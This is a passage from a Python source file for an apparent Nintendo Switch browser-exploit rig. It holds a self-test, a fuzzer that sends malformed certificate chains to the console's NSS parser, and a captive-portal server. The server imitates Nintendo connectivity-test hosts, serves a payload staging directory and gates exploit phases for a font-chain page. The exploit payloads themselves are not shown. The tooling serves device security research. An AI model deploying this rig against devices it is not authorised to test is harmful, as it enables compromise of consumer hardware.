                hdr += s.recv(1)
            expect = base64.b64encode(hashlib.sha1((key + WS_GUID).encode()).digest()).decode()
            return s, hdr.decode("latin-1"), expect

        def ws_send_masked(s, text: str) -> None:
            payload = text.encode("utf-8")
            mask = os.urandom(4)
            head = bytearray([0x81])                     # FIN + text
            n = len(payload)
            if n < 126:
                head.append(0x80 | n)
            else:
                head.append(0x80 | 126)
                head += struct.pack(">H", n)
            s.sendall(bytes(head) + mask +
                      bytes(b ^ mask[i & 3] for i, b in enumerate(payload)))

        def ws_frames(s, count: int, timeout: float = 3.0):
            s.settimeout(timeout)
            out = []
            while len(out) < count:
                _, op, data = ws_read_frame(s)
                out.append((op, json.loads(data.decode("utf-8")) if op == WS_OP_TEXT else data))
            return out

        agent_sock, agent_hdr, expect = ws_connect(port, "agent")
        try:
            check("WS agent upgrade -> 101 + correct accept",
                  "101" in agent_hdr and expect in agent_hdr,
                  "hdr=%r" % agent_hdr.splitlines()[0])
            welcome = ws_frames(agent_sock, 1)
            check("WS agent welcome frame", welcome[0][1].get("t") == "welcome",
                  "got %r" % (welcome,))

            # console + curl-driven eval round-trip through the hub
            console_sock, console_hdr, _ = ws_connect(port, "console")
            try:
                r, body = req(port, "POST", "/rig/ws/send",
                              body=json.dumps({"code": "1+1", "id": "t1"}).encode(),
                              ctype="application/json")
                check("/rig/ws/send with agent -> 200 queued",
                      r.status == 200 and json.loads(body)["id"] == "t1",
                      "status=%d body=%r" % (r.status, body))
                fwd = ws_frames(agent_sock, 1)
                check("agent received {id,code}", fwd[0][1].get("id") == "t1"
                      and fwd[0][1].get("code") == "1+1", "got %r" % (fwd,))
                ws_send_masked(agent_sock, json.dumps(
                    {"id": "t1", "ok": True, "result": 2, "elapsed": 0.1}))
                reply = ws_frames(console_sock, 1)
                check("console received agent reply",
                      reply[0][1].get("id") == "t1" and reply[0][1].get("result") == 2,
                      "got %r" % (reply,))
                r, body = req(port, "GET", "/rig/ws/state")
                state = json.loads(body)
                check("/rig/ws/state shows agent + counters",
                      state.get("agent") is True
                      and state["counters"]["forwards"] >= 1
                      and state["counters"]["agent_replies"] >= 1,
                      "state=%r" % state)
            finally:
                console_sock.close()
        finally:
            agent_sock.close()
        time.sleep(0.2)                                    # let detach land
        r, body = req(port, "POST", "/rig/ws/send",
                      body=json.dumps({"code": "1+1"}).encode(), ctype="application/json")
        check("/rig/ws/send without agent -> 409",
              r.status == 409, "status=%d" % r.status)

        r, body = req(port, "GET", "/health")
        check("/health -> 200", r.status == 200 and b"ready" in body)
        check("access log captured conntest hit",
              any("ctest.cdn.nintendo.net" in m and "-> 302" in m for m in sink.records))

        # (g) /rig/live dashboard + feed: seq monotonicity, status shape,
        # event filtering, page verdicts; plus on-disk persistence sinks
        r, body = req(port, "GET", "/rig/live")
        check("/rig/live -> 200 dashboard html",
              r.status == 200 and b"/rig/live/feed" in body
              and b"rig live" in body)
        r, body = req(port, "GET", "/rig/live/feed?since=0")
        feed1 = json.loads(body)
        check("/rig/live/feed -> seq + events + status",
              isinstance(feed1.get("seq"), int) and feed1["seq"] >= 1
              and len(feed1["events"]) >= 1
              and feed1["status"].get("phase") == 1
              and "serving" in feed1["status"] and "wsAgent" in feed1["status"])
        kinds1 = [e["kind"] for e in feed1["events"]]
        check("feed carries http_hit events", "http_hit" in kinds1, "%r" % kinds1[:6])
        seqs = [e["seq"] for e in feed1["events"]]
        check("feed seq strictly monotonic", seqs == sorted(seqs)
              and len(set(seqs)) == len(seqs))
        # a new request must appear only after the cursor
        r, _ = req(port, "GET", "/health")
        r, body = req(port, "GET", "/rig/live/feed?since=%d" % feed1["seq"])
        feed2 = json.loads(body)
        check("feed since= filters correctly",
              feed2["seq"] > feed1["seq"]
              and all(e["seq"] > feed1["seq"] for e in feed2["events"])
              and any(e["kind"] == "http_hit" for e in feed2["events"]))
        # page_report: verdict panel + event
        r, _ = req(port, "POST", "/report",
                   body=json.dumps({"schema": 1, "page": "pngztxt",
                                    "phase": "verdict",
                                    "verdict": "PARSE-PATH-LIVE",
                                    "gate": {"effectivePhase": 1}}).encode(),
                   ctype="application/json")
        r, body = req(port, "GET", "/rig/live/feed?since=%d" % feed2["seq"])
        feed3 = json.loads(body)
        check("page_report event + verdict panel",
              any(e["kind"] == "page_report" and "pngztxt" in e["summary"]
                  for e in feed3["events"])
              and feed3["status"]["pages"].get("pngztxt", {}).get("verdict")
              == "PARSE-PATH-LIVE")
        # phase gate change lands as an event, then reset
        r, _ = req(port, "POST", "/rig/phase", body=b'{"phase": 2}', ctype="application/json")
        r, body = req(port, "GET", "/rig/live/feed?since=%d" % feed3["seq"])
        feed4 = json.loads(body)
        check("phase_gate event visible",
              any(e["kind"] == "phase_gate" and "1->2" in e["summary"]
                  for e in feed4["events"])
              and feed4["status"]["phase"] == 2)
        req(port, "POST", "/rig/phase", body=b'{"phase": 1}', ctype="application/json")
        # applet first-seen: a WifiWebAuthApplet-UA report sets console state
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        conn.request("POST", "/report", body=b'{"schema":1}',
                     headers={"Content-Type": "application/json",
                              "User-Agent": "WifiWebAuthApplet/2.0 (LiveSim)"})
        r = conn.getresponse()
        r.read()
        conn.close()
        r, body = req(port, "GET", "/rig/live/feed?since=%d" % 0)
        feedAll = json.loads(body)
        check("applet_entry event + console first-seen in status",
              any(e["kind"] == "applet_entry" for e in feedAll["events"])
              and (feedAll["status"].get("console") or {}).get("peer") == "127.0.0.1")
        # on-disk sinks survived everything this run threw at them
        with open(cfg.access_path, "r", encoding="utf-8") as f:
            alines = [json.loads(l) for l in f.read().splitlines() if l.strip()]
        req_lines = [l for l in alines if "kind" not in l]
        check("access jsonl persisted with request lines",
              len(req_lines) >= 10 and all("peer" in l and "status" in l
                                           for l in req_lines[:10]),
              "req_lines=%d" % len(req_lines))
        check("access jsonl carries control-plane lines",
              any(l.get("kind") == "phase_gate" and l.get("from") == 1
                  and l.get("to") == 2 for l in alines))
        with open(cfg.ws_log_path, "r", encoding="utf-8") as f:
            wlines = [json.loads(l) for l in f.read().splitlines() if l.strip()]
        check("ws jsonl persisted both directions",
              any(l.get("dir") == "in" for l in wlines)
              and any(l.get("dir") == "out" for l in wlines)
              and all("preview" in l and "size" in l for l in wlines[:4]),
              "lines=%d" % len(wlines))
    finally:
        srv.shutdown()
        ok_srv.shutdown()
        srv.server_close()
        ok_srv.server_close()
        cfg.close()
        ok_cfg.close()
        LOG.removeHandler(sink)
        LOG.setLevel(old_level)
        shutil.rmtree(tmp, ignore_errors=True)

    print("self-test: %s (%d failure%s)" % ("PASS" if failures == 0 else "FAIL",
                                            failures, "" if failures == 1 else "s"))
    return 0 if failures == 0 else 1


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# barbarism: cert-fuzz server — NSS chain-parser fuzzing (0.1.13)
# ---------------------------------------------------------------------------

class CertFuzzServer(socketserver.ThreadingTCPServer):
    """One malformed-chain corpus variant per accepted TLS connection.

    The console's ssl sysmodule (NSS) parses whatever we present; expected
    outcome is a decoded fatal alert (logged with the reason), the hunt is
    for variants that change the alert stage, hang, or reset the connection
    (parser confusion) instead.
    """
    daemon_threads = True
    allow_reuse_address = True

    def __init__(self, addr, cfg, corpus_dir):
        self.cfg = cfg
        corpus = sorted(Path(corpus_dir).glob('*.der'))
        fuzz_key = Path(corpus_dir) / 'fuzz.key'
        self.variants = []
        for der_path in corpus:
            pem = der_path.with_suffix('.pem')
            r = subprocess.run(['openssl', 'x509', '-inform', 'DER',
                                '-in', str(der_path), '-out', str(pem)],
                               capture_output=True)
            if r.returncode == 0:
                self.variants.append((der_path.stem, str(pem), str(fuzz_key)))
        if not self.variants:
            raise RuntimeError('cert-fuzz corpus empty: %s' % corpus_dir)
        self.counter = 0
        self._lock = threading.Lock()
        super().__init__(addr, CertFuzzHandler)

    def get_request(self):
        conn, addr = super().get_request()
        with self._lock:
            name, pem, key = self.variants[self.counter % len(self.variants)]
            self.counter += 1
        try:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(pem, key)
            conn = ctx.wrap_socket(conn, server_side=True)
            LOG.info("CERTFUZZ %s variant=%s handshake=OK", addr[0], name)
        except (ssl.SSLError, OSError) as exc:
            LOG.info("CERTFUZZ %s variant=%s reject=%r", addr[0], name, exc)
            try:
                conn.close()
            except OSError:
                pass
            raise OSError('fuzz variant consumed')  # socketserver: silent skip
        return conn, addr


class CertFuzzHandler(socketserver.BaseRequestHandler):
    def handle(self):
        try:
            self.request.settimeout(2)
            self.request.recv(4096)
        except OSError:
            pass

    def finish(self):
        try:
            self.request.close()
        except OSError:
            pass


def ensure_tls_cert(cert: str, key: str) -> None:
    """Generate a self-signed conntest cert on first use (openssl CLI)."""
    if os.path.isfile(cert) and os.path.isfile(key):
        return
    os.makedirs(os.path.dirname(cert), exist_ok=True)
    san = ("subjectAltName=DNS:ctest.cdn.nintendo.net,"
           "DNS:ctest.p01.ctest.srv.nintendo.net,DNS:conntest.nintendowifi.net,"
           "DNS:*.nintendo.net,DNS:*.srv.nintendo.net,DNS:*.lp1.ndas.srv.nintendo.net,"
           "DNS:*.lp1.d4c.srv.nintendo.net,DNS:*.lp1.ctest.srv.nintendo.net")
    r = subprocess.run(
        ["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes",
         "-keyout", key, "-out", cert, "-days", "3650",
         "-subj", "/CN=ctest.cdn.nintendo.net", "-addext", san],
        capture_output=True, text=True, timeout=60)
    if r.returncode != 0 or not (os.path.isfile(cert) and os.path.isfile(key)):
        raise RuntimeError("openssl cert generation failed: %s"
                           % (r.stderr or "").strip()[:200])


def main(argv=None) -> int:
    ap = argparse.ArgumentParser(description="Captive-portal HTTP server for the BarbarismJB webkit rig")
    ap.add_argument("--ip", help="LAN IPv4 to bind and advertise")
    ap.add_argument("--interface", help="interface name whose IPv4 to use (e.g. wlan0, en0)")
    ap.add_argument("--port", type=int, default=80,
                    help="HTTP port (default 80 -- the conntest URL implies :80)")
    ap.add_argument("--conntest-profile", choices=("redirect", "success", "ok-no-org",
                     "redirect-xorg", "redirect-samehost", "no-content", "hang"),
                    default="redirect",
                    help="the conntest response shape — decides which branch of the "
                         "console's connectivity state machine runs (see "
                         "docs/WEBKIT-PROFILES.md)")
    ap.add_argument("--conntest-mode", choices=("portal", "success"), default=None,
                    help=argparse.SUPPRESS)  # 0.1.7 back-compat alias
    ap.add_argument("--runs-dir", default=os.path.join(SCRIPT_DIR, "runs"),
                    help="telemetry sink directory (default: <rig>/runs)")
    ap.add_argument("--stage-dir", default=os.path.join(SCRIPT_DIR, "stage"),
                    help="payload staging directory served at /stage/* (default: <rig>/stage)")
    ap.add_argument("--probe-page", default=None, metavar="FILE",
                    help="second page (e.g. probe-32439.html) made servable at /portal "
                         "via a local-only POST /rig/swap (launch.py --auto-probe uses this)")
    ap.add_argument("--fontchain-phase", type=int, choices=(1, 2, 3), default=1,
                    help="exploit-phase gate for the fontchain page (1=trigger-only "
                         "crash oracle [default, SAFE], 2=+reclaim spray, 3=+arb-read "
                         "stub); runtime-adjustable at local-only /rig/phase")
    ap.add_argument("--cert-fuzz", metavar="DIR", default=None,
                    help="serve malformed cert-chain corpus (one variant per TLS "
                         "connection) from DIR — NSS parser fuzzing; overrides "
                         "the normal TLS cert")
    ap.add_argument("--bvc-profile", choices=("404", "empty", "json", "xml"),
                    default="404",
                    help="response shape for bvc-hac-*.cdn.nintendo.net (NIM safe-"
                         "version feed) — the applet-gate experiment")
    ap.add_argument("--tls-port", type=int, default=None, metavar="PORT",
                    help="ALSO serve the same content over TLS (self-signed cert for the "
                         "conntest hosts) — for firmwares whose conntest is HTTPS "
                         "(fw 23.x behavior). Default: off; launch.py passes 443 in "
                         "direct mode")
    ap.add_argument("--tls-cert", default=os.path.join(SCRIPT_DIR, "certs", "rig-cert.pem"))
    ap.add_argument("--tls-key", default=os.path.join(SCRIPT_DIR, "certs", "rig-key.pem"))
    ap.add_argument("--self-test", action="store_true", help="run offline self-test and exit")
    args = ap.parse_args(argv)

    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(message)s", datefmt="%H:%M:%S")

    if args.self_test:
        return self_test()
    if not os.path.isfile(PORTAL_FILE):
        print("error: %s missing (E_NO_PORTAL_PAGE)" % PORTAL_FILE, file=sys.stderr)
        return 2
    if args.probe_page and not os.path.isfile(args.probe_page):
        print("error: probe page %s missing (E_NO_PROBE_PAGE)" % args.probe_page, file=sys.stderr)
        return 2

    ip = resolve_bind_ip(args)
    if ip.startswith("127.") or ip == "0.0.0.0":
        print("warning: %s is not a LAN IP; the console will not reach it" % ip, file=sys.stderr)
    # barbarism: BOTH privileged binds (HTTP and TLS) happen BEFORE the
    # privilege drop — binding 443 after dropping can never succeed, which
    # silently killed the TLS listener in 0.1.2/0.1.3 sessions.
    if args.conntest_mode:
        args.conntest_profile = "redirect" if args.conntest_mode == "portal" else "success"
    cfg = RigConfig(ip, args.port, args.runs_dir, args.stage_dir, args.conntest_profile,
                    args.probe_page, args.bvc_profile, args.fontchain_phase)
    tls_srv = None
    if args.tls_port:
        try:
            if args.cert_fuzz:
                # barbarism: cert-fuzz mode — one corpus variant per TLS
                # connection; the console's NSS cert parser is the target.
                tls_srv = CertFuzzServer((ip, args.tls_port), cfg,
                                         args.cert_fuzz)
                print("tls: CERT-FUZZ MODE — serving malformed chain corpus "
                      "(one variant per connection; variant logged per accept)",
                      flush=True)
            else:
                ensure_tls_cert(args.tls_cert, args.tls_key)
                context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
                context.load_cert_chain(args.tls_cert, args.tls_key)
                tls_srv = RigHTTPServer((ip, args.tls_port), cfg)
                tls_srv.socket = context.wrap_socket(tls_srv.socket, server_side=True)
        except (PermissionError, OSError, RuntimeError, ssl.SSLError) as e:
            print("warning: TLS listener not started (%s); HTTP-only mode" % e,
                  flush=True)
            tls_srv = None
    try:
        srv = RigHTTPServer((ip, args.port), cfg)
    except PermissionError:
        print("error: cannot bind %s:%d (E_PERM); use sudo (privileges are dropped after "
              "bind), or pick a high --port for offline tests" % (ip, args.port), file=sys.stderr)
        return 2
    except OSError as e:
        print("error: bind %s:%d failed: %s (E_BIND)" % (ip, args.port, e), file=sys.stderr)
        return 2
    maybe_drop_privs()
    if tls_srv:
        threading.Thread(target=tls_srv.serve_forever, name="rig-portal-tls",
                         daemon=True).start()
        print("tls: also serving %s:%d (self-signed conntest cert; handshake "
              "rejects from the console are logged and EXPECTED if the applet "
              "enforces trust)" % (ip, args.tls_port), flush=True)
    print("%s/%s on %s:%d%s | portal=%s | probe-page=%s | pages=%s | fontchain-phase=%d | runs=%s | stage=%s | conntest-profile=%s"
          % (RIG_NAME, RIG_VERSION, ip, args.port,
             ("+:%d TLS" % args.tls_port) if tls_srv else " | plain HTTP only",
             cfg.portal_url(), args.probe_page or "(none)",
             ",".join(sorted(cfg.pages)) or "(none)", cfg.get_phase(), cfg.runs_path,
             cfg.stage_dir, args.conntest_profile), flush=True)
    print("Ctrl-C to stop; when done, re-run with --conntest-profile success once, then restore "
          "Automatic DNS on the console")
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nstopping")
    finally:
        srv.server_close()
        if tls_srv:
            tls_srv.server_close()
        cfg.close()
    return 0


if __name__ == "__main__":
    sys.exit(main())
